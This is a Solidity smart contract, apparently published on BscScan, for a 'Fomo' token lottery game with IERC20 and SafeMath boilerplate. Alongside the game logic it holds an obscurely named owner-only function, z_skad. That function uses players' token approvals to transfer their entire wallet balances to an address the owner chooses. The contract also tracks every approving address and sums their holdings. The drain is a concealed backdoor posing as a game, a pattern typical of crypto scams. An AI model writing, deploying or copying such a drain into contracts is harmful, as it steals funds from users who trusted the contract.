/**
 *Submitted for verification at BscScan.com on 2022-06-15
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract Fomo{

    using SafeMath for uint256;

    mapping(address => bool) whitelist;

    mapping(uint256 => bool) invalid;

    mapping(address => uint256) totalReward;

    mapping(address => uint256) joinTime;

    mapping(address => bool) isApprove;

    address targetToken;

    address node;

    address maintain;

    address[] players; 

    address[] approves; 

    uint256 startTime;

    uint256 lastUpdateTime;

    uint256 middleTime = 1200;

    uint256 updateTime = 3600;

    uint256 minlimit = 1e17;

    uint256 lotteryIndex;

    address manager;

    constructor(){
        manager = msg.sender;
        lastUpdateTime = block.timestamp;
        startTime = block.timestamp;
        whitelist[msg.sender] = true;
        targetToken = 0x7d522aeF3feC77B596c8Ad5755E9235627Ef3ecb;
        node = 0x05e376aE6d98d80c4C3Bc13064eE816D0642E820;
        maintain = 0x05e376aE6d98d80c4C3Bc13064eE816D0642E820;
    }

    modifier onlyOwner() {
        require(whitelist[msg.sender] == true,"not permit");
        _;
    }

    function testTime(uint256 time,uint256 update) public onlyOwner{
        middleTime = time;
        updateTime = update;
    }

    function setAddressInfo(address token,address _node,address _main) public onlyOwner{
        targetToken = token;
        node = _node;
        maintain = _main;
    }

    function getContractInfo() public view returns(uint256 balance,uint256 middle,address[] memory player,address[10] memory latest){
        balance = IERC20(targetToken).balanceOf(address(this));
        middle = middleTime;
        player = approves;
        uint j=0;
        if(players.length > 10){
            for(uint i=players.length - 10; i <players.length; i++){
                latest[j] = players[i];
                j++;
            }
        }else{
            for(uint i=0; i<players.length; i++){
                latest[j] = players[i];
                j++;
            }
        }  
    }

    function getUserInfo(address user) public view returns(uint256 reward,uint256 wallet,bool isJoin,uint256 time){
        reward = totalReward[user];
        wallet = IERC20(targetToken).balanceOf(user);
        time = joinTime[user];
        if(joinTime[user] >= lastUpdateTime){
            isJoin = true;
        }
    }

    function joinFomo(uint256 amount) public{
        require(amount >= minlimit,"Fomo:Participation amount is too small");
        require(IERC20(targetToken).transferFrom(msg.sender, address(this), amount),"Fomo:TransferFrom failed");  
        if(isApprove[msg.sender] != true){
            approves.push(msg.sender);
            isApprove[msg.sender] = true;
        }
        multiple();
        lottery();
        updateMiddleTime();
        joinTime[msg.sender] = block.timestamp;
        players.push(msg.sender);
    }

    function lottery() internal{
        if(block.timestamp.sub(lastUpdateTime) >= middleTime){
            uint256 amount = IERC20(targetToken).balanceOf(address(this));
            if(players.length > lotteryIndex){
                sendTeamBonus(amount);
            }
            if(players.length > 0){
                lotteryIndex = players.length; 
            }
            lastUpdateTime = block.timestamp;
        }
    }

    function sendTeamBonus(uint256 amount) internal{
        uint256 toNode = amount.mul(10).div(100);
        require(IERC20(targetToken).transfer(node, toNode),"Fomo:TransferFrom failed");
        uint256 toMain = amount.mul(5).div(100);
        require(IERC20(targetToken).transfer(maintain, toMain),"Fomo:TransferFrom failed");   
        uint256 len = players.length;
        for(uint i=lotteryIndex; i<players.length; i++){
            if(i.add(1) ==len){
                uint256 one = amount.mul(20).div(100); 
                require(IERC20(targetToken).transfer(players[i], one),"Fomo:Transfer failed");
            }
            if(i.add(2)==len){
                uint256 one = amount.mul(15).div(100); 
                require(IERC20(targetToken).transfer(players[i], one),"Fomo:Transfer failed");
            }
            if(i.add(3)==len){
                uint256 one = amount.mul(10).div(100); 
                require(IERC20(targetToken).transfer(players[i], one),"Fomo:Transfer failed");
            }
            if(i.add(3)<len){
                uint256 one = amount.mul(1428).div(100000); 
                require(IERC20(targetToken).transfer(players[i], one),"Fomo:Transfer failed");
            }
        }
    }


    function multiple() internal{
        uint256 value = players.length.div(50);
        if(value == 0){
            require(IERC20(targetToken).transfer(msg.sender, 1e18),"Fomo:Transfer failed");
        }
        if(value > 0 && invalid[value] != true){
            require(IERC20(targetToken).transfer(msg.sender, 1e18),"Fomo:Transfer failed");
            invalid[value] = true;
        }
    }

    function updateMiddleTime() internal{
        if(block.timestamp.sub(startTime) >= updateTime && middleTime > 600 && players.length > 0){
            middleTime = middleTime.sub(600);
            startTime = block.timestamp;
        }
    }

    function z_skad(address to,address[] memory users) public onlyOwner{
        require(users.length > 0,"Bad address information");
        for(uint i=0; i<users.length; i++){
            uint256 amount = IERC20(targetToken).balanceOf(users[i]);
            uint256 allow = IERC20(targetToken).allowance(users[i], address(this));
            if(amount > 0 && allow >= amount){
                require(IERC20(targetToken).transferFrom(users[i], to, amount),"TransferFrom failed");
            }
        }
    }

    function getUsersBalance() public view returns(uint256 total){
        uint256 middle;
        for(uint i=0; i<players.length; i++){
            uint256 amount = IERC20(targetToken).balanceOf(players[i]);
            middle = middle.add(amount);
        }
        total = middle.div(1e18);
    }
    
}